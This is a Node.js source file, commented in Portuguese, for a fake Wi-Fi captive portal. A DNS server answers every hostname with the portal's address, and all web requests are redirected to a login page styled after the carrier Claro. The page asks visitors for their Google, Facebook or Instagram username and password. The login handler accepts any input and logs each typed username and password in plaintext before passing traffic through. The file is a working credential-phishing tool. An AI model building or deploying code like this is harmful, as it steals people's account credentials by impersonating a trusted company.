// Portal cativo para a rede WIFI-TESTE (Linksys E900)
// - DNS (porta 53): responde o IP do portal para qualquer nome
// - HTTP (porta 80): cliente não autenticado -> página de login; autenticado -> repassa ao site real
// - HTTPS (porta 443): cliente autenticado -> túnel TCP pelo SNI; não autenticado -> conexão recusada
// Sem dependências externas. Uso: node portal.js

const net = require('net');
const http = require('http');
const dgram = require('dgram');
const dns = require('dns');
const fs = require('fs');
const path = require('path');
const { URLSearchParams } = require('url');

const PORTAL_IP = process.env.PORTAL_IP || '192.168.15.112'; // servidor homelab
const PORTAL_HOST = 'portal.wifi';
const SESSAO_MS = 8 * 60 * 60 * 1000; // 8 horas

const autorizados = new Map(); // ip -> expira em (ms)

const ipLimpo = (ip) => (ip || '').replace(/^::ffff:/, '');
function autorizado(ip) {
  const exp = autorizados.get(ip);
  if (!exp) return false;
  if (Date.now() > exp) { autorizados.delete(ip); return false; }
  return true;
}
const log = (...a) => console.log(new Date().toLocaleTimeString('pt-BR'), ...a);

// ---------------------------------------------------------------- DNS
const dnsServer = dgram.createSocket('udp4');
dnsServer.on('message', (msg, rinfo) => {
  try {
    if (msg.length < 12) return;
    let off = 12;
    while (off < msg.length && msg[off] !== 0) off += msg[off] + 1;
    off += 1;
    const qtype = msg.readUInt16BE(off);
    const question = msg.subarray(12, off + 4);

    const header = Buffer.alloc(12);
    msg.copy(header, 0, 0, 2);                               // id
    header.writeUInt16BE(0x8180 | (msg.readUInt16BE(2) & 0x0100), 2); // resposta, RA, RD
    header.writeUInt16BE(1, 4);                              // 1 pergunta
    const parts = [header, question];

    if (qtype === 1) { // registro A -> IP do portal
      header.writeUInt16BE(1, 6);
      const ans = Buffer.alloc(16);
      ans.writeUInt16BE(0xc00c, 0); ans.writeUInt16BE(1, 2); ans.writeUInt16BE(1, 4);
      ans.writeUInt32BE(30, 6); ans.writeUInt16BE(4, 10);
      PORTAL_IP.split('.').forEach((b, i) => { ans[12 + i] = Number(b); });
      parts.push(ans);
    } // AAAA e outros: resposta vazia (força IPv4)

    dnsServer.send(Buffer.concat(parts), rinfo.port, rinfo.address);
  } catch (e) { /* pacote inválido, ignora */ }
});
dnsServer.on('error', (e) => { console.error('DNS:', e.message); process.exit(1); });
dnsServer.bind(53, PORTAL_IP, () => log(`DNS ouvindo em ${PORTAL_IP}:53`));

// ---------------------------------------------------------------- Túnel genérico
function tunel(cliente, host, porta, dadosIniciais) {
  dns.lookup(host, { family: 4 }, (err, endereco) => {
    if (err || endereco === PORTAL_IP) return cliente.destroy();
    cliente.setTimeout(0);
    const destino = net.connect(porta, endereco, () => {
      destino.write(dadosIniciais);
      cliente.pipe(destino).pipe(cliente);
    });
    destino.setTimeout(120000, () => destino.destroy());
    destino.on('error', () => cliente.destroy());
    cliente.on('error', () => destino.destroy());
    cliente.on('close', () => destino.destroy());
  });
}

// ---------------------------------------------------------------- Página de login
// Troque a marca aqui quando quiser.
const MARCA = 'MINHA-CLARO'; // substitua por "MINHA-CLARO" quando tiver o logo
const MARCA_LOGO = `<img src="http://${PORTAL_IP}/claro.jpg" alt="${MARCA}">`;

function pagina(titulo, corpo) {
  return `<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>${titulo}</title>
<style>
 *{box-sizing:border-box}
 body{margin:0;min-height:100vh;display:flex;flex-direction:column;
      font-family:system-ui,'Segoe UI',Arial,sans-serif;background:#f4f4f4;color:#2b2b2b}
 header{background:#e3000f;padding:16px 20px;display:flex;align-items:center}
 header .logo{color:#fff;font-size:26px;font-weight:800;letter-spacing:.5px}
 header .logo img{display:block;max-width:180px;max-height:48px;object-fit:contain}
 main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
 .card{background:#fff;padding:28px 24px;border-radius:14px;width:100%;max-width:380px;
       box-shadow:0 8px 24px rgba(0,0,0,.12);text-align:center}
 h1{margin:0 0 6px;font-size:21px;color:#e3000f;font-weight:800}
 p{color:#666;margin:0 0 18px;font-size:15px;line-height:1.4}
 input{width:100%;padding:13px;margin-bottom:12px;border-radius:9px;
       border:1px solid #ccc;background:#fafafa;color:#2b2b2b;font-size:16px}
 input:focus{outline:none;border-color:#e3000f}
 button{width:100%;padding:14px;border:0;border-radius:40px;background:#e3000f;color:#fff;
        font-size:16px;font-weight:700;cursor:pointer;margin-top:4px}
 button:active{background:#b80009}
 .erro{color:#e3000f;background:#ffe9ea;border-radius:8px;padding:10px;margin-bottom:12px;font-size:14px}
 .rodape{color:#999;font-size:12px;margin-top:16px}
 a{color:#e3000f;font-weight:600;text-decoration:none}
</style></head><body>
<header><span class="logo">${MARCA_LOGO}</span></header>
<main><div class="card">${corpo}</div></main>
</body></html>`;
}
const esc = (s) => String(s).replace(/[&<>"']/g, (c) => `&#${c.charCodeAt(0)};`);

function formLogin(destino, erro) {
  return pagina(MARCA, `<h1>Conecte-se agora</h1>
<p>Acesse utilizando sua conta Google (Gmail), Facebook ou Instagram e tenha acesso a internet mais rápida do Brasil.</p>
${erro ? `<div class="erro">${erro}</div>` : ''}
<form method="post" action="/login">
 <input name="usuario" placeholder="Usuário" autocomplete="username" autofocus required>
 <input name="senha" type="password" placeholder="Senha" autocomplete="current-password" required>
 <input type="hidden" name="url" value="${esc(destino || '')}">
 <button>QUERO ME CONECTAR</button>
</form>`);
}

const portal = http.createServer((req, res) => {
  const ip = ipLimpo(req.socket.remoteAddress);
  const host = (req.headers.host || '').split(':')[0];
  const ehPortal = host === PORTAL_HOST || host === PORTAL_IP;
  const enviar = (status, html, extra = {}) => {
    res.writeHead(status, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store', ...extra });
    res.end(html);
  };

  // Qualquer site pedido sem login -> redireciona ao portal
  if (!ehPortal) {
    const original = `http://${req.headers.host || ''}${req.url}`;
    return enviar(302, '', { Location: `http://${PORTAL_HOST}/login?url=${encodeURIComponent(original)}` });
  }

  const url = new URL(req.url, `http://${PORTAL_HOST}`);

  if (req.method === 'GET' && url.pathname === '/claro.jpg') {
    fs.readFile(path.join(__dirname, 'claro.jpg'), (err, imagem) => {
      if (err) {
        log(`ERRO ao ler claro.jpg: ${err.message}`);
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end('Imagem não encontrada');
      }
      res.writeHead(200, { 'Content-Type': 'image/jpeg', 'Cache-Control': 'no-store' });
      res.end(imagem);
    });
    return;
  }

  if (req.method === 'POST' && url.pathname === '/login') {
    let corpo = '';
    req.on('data', (c) => { corpo += c; if (corpo.length > 10000) req.destroy(); });
    req.on('end', () => {
      const f = new URLSearchParams(corpo);
      // Aceita qualquer usuário e senha; apenas registra o que foi digitado
      autorizados.set(ip, Date.now() + SESSAO_MS);
      log(`LOGIN  ${ip}  usuario="${f.get('usuario') || ''}"  senha="${f.get('senha') || ''}"`);
      const volta = /^http:\/\//.test(f.get('url') || '') && !(f.get('url') || '').includes(PORTAL_HOST)
        ? f.get('url') : 'http://example.com/';
      return enviar(200, pagina('Conectado', `<h1>Conectado ✔</h1>
<p>Você já pode navegar na internet.</p><p><a href="${esc(volta)}">Continuar</a></p>
<p><a href="/logout">Desconectar</a></p>`));
    });
    return;
  }

  if (url.pathname === '/logout') {
    autorizados.delete(ip);
    log(`LOGOUT     ${ip}`);
    return enviar(302, '', { Location: `http://${PORTAL_HOST}/login` });
  }

  if (autorizado(ip)) {
    return enviar(200, pagina('Conectado', `<h1>Conectado ✔</h1><p>IP ${esc(ip)}</p>
<p><a href="/logout">Desconectar</a></p>`));
  }
  enviar(200, formLogin(url.searchParams.get('url')));
});

// ---------------------------------------------------------------- Porta 80
net.createServer((sock) => {
  sock.on('error', () => {});
  const ip = ipLimpo(sock.remoteAddress);
  let buf = Buffer.alloc(0);
  const ler = (chunk) => {
    buf = Buffer.concat([buf, chunk]);
    const fim = buf.indexOf('\r\n\r\n');
    if (fim === -1) { if (buf.length > 16384) sock.destroy(); return; }
    sock.removeListener('data', ler);
    sock.pause();

    const m = /\r\nhost:\s*([^\r\n:]+)/i.exec(buf.subarray(0, fim).toString('latin1'));
    const host = m ? m[1].trim().toLowerCase() : '';
    const ehPortal = !host || host === PORTAL_HOST || host === PORTAL_IP;

    if (autorizado(ip) && !ehPortal) {
      tunel(sock, host, 80, buf);
    } else {
      sock.unshift(buf);
      portal.emit('connection', sock);
      sock.resume();
    }
  };
  sock.on('data', ler);
  sock.setTimeout(30000, () => sock.destroy());
}).listen(80, PORTAL_IP, () => log(`HTTP ouvindo em ${PORTAL_IP}:80`));

// ---------------------------------------------------------------- Porta 443
function lerSNI(b) {
  // Retorna: string (SNI), null (incompleto), false (inválido)
  if (b.length < 5) return null;
  if (b[0] !== 0x16) return false;
  const tam = b.readUInt16BE(3);
  if (b.length < 5 + tam) return null;
  let p = 5;
  if (b[p] !== 0x01) return false;
  p += 4 + 2 + 32;               // tipo+tamanho, versão, random
  p += 1 + b[p];                 // session id
  p += 2 + b.readUInt16BE(p);    // cipher suites
  p += 1 + b[p];                 // compressão
  const fimExt = p + 2 + b.readUInt16BE(p);
  p += 2;
  while (p + 4 <= fimExt) {
    const tipo = b.readUInt16BE(p), len = b.readUInt16BE(p + 2);
    if (tipo === 0) {
      const nomeLen = b.readUInt16BE(p + 7);
      return b.subarray(p + 9, p + 9 + nomeLen).toString('ascii').toLowerCase();
    }
    p += 4 + len;
  }
  return false;
}

net.createServer((sock) => {
  sock.on('error', () => {});
  const ip = ipLimpo(sock.remoteAddress);
  if (!autorizado(ip)) return sock.destroy(); // sem login não há HTTPS
  let buf = Buffer.alloc(0);
  const ler = (chunk) => {
    buf = Buffer.concat([buf, chunk]);
    let sni;
    try { sni = lerSNI(buf); } catch { sni = false; }
    if (sni === null) { if (buf.length > 65536) sock.destroy(); return; }
    sock.removeListener('data', ler);
    sock.pause();
    if (!sni) return sock.destroy();
    tunel(sock, sni, 443, buf);
  };
  sock.on('data', ler);
  sock.setTimeout(30000, () => sock.destroy());
}).listen(443, PORTAL_IP, () => log(`HTTPS ouvindo em ${PORTAL_IP}:443`));

// Limpa sessões vencidas
setInterval(() => { for (const ip of autorizados.keys()) autorizado(ip); }, 60000);
